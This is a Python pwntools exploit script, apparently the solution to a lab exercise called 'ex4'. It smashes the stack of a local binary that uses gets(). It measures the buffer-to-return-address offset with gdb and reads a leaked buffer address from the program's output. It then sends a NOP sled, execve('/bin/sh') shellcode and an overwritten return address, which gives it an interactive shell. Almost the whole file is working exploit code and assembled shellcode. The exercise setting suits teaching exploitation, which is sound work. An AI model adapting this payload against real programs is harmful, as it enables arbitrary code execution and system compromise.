#!/usr/bin/env python3
#
# solve_ex4.py 
#
#   1. Use gdb ONCE to compute the distance (in bytes) between the local
#      buffer and the saved return address inside main's stack frame:
#         OFFSET = (address of RET) - (address of buffer)
#      This offset is independent of ASLR, because buffer and RET move
#      together when the stack is randomized.
#
#   2. Run ./bin/ex4 normally. The program prints:
#         "Buffer at 0x........"
#      We parse this line to get the *runtime* buffer address for this
#      specific process (with ASLR enabled).
#
#   3. Build a payload that is exactly:
#         [ NOP sled ][ shellcode + "/bin/sh\0" ][ NOP padding ]  == OFFSET bytes
#         [ p64(runtime_buf) ]
#
#      The first OFFSET bytes fill the buffer and the space up to the
#      saved RET. The final 8 bytes overwrite the saved RET with
#      runtime_buf (the actual buffer address).
#
#   4. When main returns, RET jumps to runtime_buf, i.e. the start of
#      our NOP sled. CPU slides through NOPs into the shellcode, which
#      does execve("/bin/sh", NULL, NULL) using RIP-relative addressing
#      and the embedded "/bin/sh" string. The process image becomes a
#      real /bin/sh controlled by pwntools.
#

from pwn import *
import subprocess
import re
import struct

# Tell pwntools (and asm()) that we are on 64-bit Linux.
context.update(arch='amd64', os='linux')


def compute_offset() -> int:
    """
    Use gdb once to compute the distance from the start of `buffer`
    to the saved return address (RET) in main's frame.

    We:
      - load ./bin/ex4 in gdb
      - break in main and run the program
      - step past the function prologue so rbp is set
      - print:
          BUF= &buffer
          RET= $rbp + 8
      - parse those addresses and return RET - BUF as an integer.

    This OFFSET is ASLR-independent: if the stack moves, both &buffer
    and RET move together, so their difference stays constant.
    """
    cmd = [
        "gdb", "-q", "-batch",
        "-ex", "file ./bin/ex4",          # load the target
        "-ex", "break main",              # stop at main
        "-ex", "run",                     # run until breakpoint
        "-ex", "frame 0",                 # select main's frame
        "-ex", "nexti 2",                 # step over prologue (push rbp; mov rbp, rsp)
        "-ex", "printf \"BUF=%p\\n\", &buffer",   # print address of local buffer
        "-ex", "printf \"RET=%p\\n\", (void*)($rbp+8)",  # print address of saved RET
        "-ex", "quit",
    ]

    # Run gdb and capture all output (stdout + stderr).
    out = subprocess.run(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    ).stdout

    # Extract BUF=0x... and RET=0x... using regexes.
    m_buf = re.search(r"BUF\s*=\s*(0x[0-9a-fA-F]+)", out)
    m_ret = re.search(r"RET\s*=\s*(0x[0-9a-fA-F]+)", out)
    if not (m_buf and m_ret):
        # If we cannot find these lines, we dump the gdb output to help debugging.
        raise RuntimeError("Failed to parse BUF/RET from gdb:\n" + out)

    buf_addr = int(m_buf.group(1), 16)
    ret_addr = int(m_ret.group(1), 16)

    # Distance in bytes from buffer start to saved RET slot on the stack.
    offset = ret_addr - buf_addr
    return offset


def build_payload(offset: int, buf_addr: int) -> bytes:
    """
    Build the exploit payload:

        [ NOP sled ][ shellcode + "/bin/sh\\0" ][ NOP padding ]  (length = offset)
        [ p64(buf_addr) ]

    where:
      - NOP sled gives us a forgiving landing zone for RET.
      - shellcode performs execve("/bin/sh", NULL, NULL).
      - "/bin/sh\\0" is embedded after the code; RIP-relative LEA
        uses the label `binsh` to find it at runtime.
      - padding is chosen so that everything *before* RET is exactly
        `offset` bytes.
      - p64(buf_addr) overwrites RET with the actual runtime buffer
        address so that `ret` jumps into our NOP sled.
    """

    # Assemble shellcode using pwntools' asm(). This avoids manual
    # hex opcodes and automatically handles RIP-relative addressing
    # for `binsh`.
    shellcode = asm("""
        /* Syscall: execve("/bin/sh", NULL, NULL) on x86_64 Linux */

        mov rax, 59          /* RAX = 59 (SYS_execve) */
        lea rdi, [rip+binsh] /* RDI = &"/bin/sh" via RIP-relative label */
        xor rsi, rsi         /* RSI = 0 (argv = NULL) */
        xor rdx, rdx         /* RDX = 0 (envp = NULL) */
        syscall              /* execve("/bin/sh", NULL, NULL) */

    /* This label lives immediately after the code. */
    binsh:
        .string "/bin/sh"
    """)

    # Single x86_64 NOP as bytes; asm('nop') typically returns b"\x90".
    nop = asm('nop')

    # Build the "body" that will occupy the buffer region and everything
    # up to (but not including) RET.
    body = bytearray()

    # 1) Small NOP sled at the very start of the buffer.
    #    If RET lands anywhere in these 16 bytes, execution will slide
    #    into the shellcode safely.
    body += nop * 16

    # 2) Our assembled shellcode, which already includes the "/bin/sh\\0"
    #    string at the end thanks to the `binsh` label and `.string`.
    body += shellcode

    # 3) Compute how many extra bytes we can fill with NOPs before we
    #    reach the RET slot. After this step, len(body) must be == offset.
    pad_len = offset - len(body)
    if pad_len < 0:
        # If body already exceeds offset, we'd overwrite RET too early,
        # corrupting the shellcode/string layout. In this exercise, that
        # should not happen if offset is correct.
        raise ValueError(f"Shellcode is too long! ({len(body)} bytes, max {offset})")

    # 4) Pad with NOPs so the last byte of `body` lands just before RET.
    body += nop * pad_len

    # 5) Finally, append the *runtime* buffer address. These 8 bytes are
    #    written exactly on top of the saved RET slot (at rbp+8).
    #    After overflow, `ret` will pop buf_addr into RIP and jump to
    #    the start of the NOP sled in our buffer.
    payload = bytes(body) + p64(buf_addr)

    return payload


def main():
    print("[*] Computing buffer -> RET offset via gdb...")
    offset = compute_offset()
    print(f"[+] Buffer -> RET offset = {offset} bytes")

    print("[*] Starting process to get runtime buffer address...")
    # Start a fresh instance of ex4. ASLR will randomize its stack,
    # but the program itself leaks the address of 'buffer'.
    p = process("./bin/ex4")

    # First line ex4 prints is "Buffer at 0x........"
    banner = p.recvline(timeout=2).decode(errors="ignore").strip()
    print(f"[+] Program banner: {banner}")

    # Parse the leaked buffer address.
    m = re.search(r"Buffer at (0x[0-9a-fA-F]+)", banner)
    if not m:
        print("[!] Failed to parse runtime buffer address")
        p.close()
        return

    runtime_buf = int(m.group(1), 16)
    print(f"[+] Runtime buffer address = {hex(runtime_buf)}")

    # Build a payload that:
    #   - fills exactly 'offset' bytes from &buffer up to RET, and
    #   - overwrites RET with this runtime_buf so ret jumps to the buffer.
    payload = build_payload(offset, runtime_buf)
    print(f"[*] Payload length = {len(payload)} bytes")

    # Send the payload followed by a newline.
    # gets(buffer) reads until newline, but does not store '\n' in the buffer.
    p.sendline(payload)

    print("[*] Switching to interactive mode...")
    # At this point, if everything worked, the ex4 process image
    # has been replaced by /bin/sh, so we should be talking to a real shell.
    p.interactive()


if __name__ == "__main__":
    main()

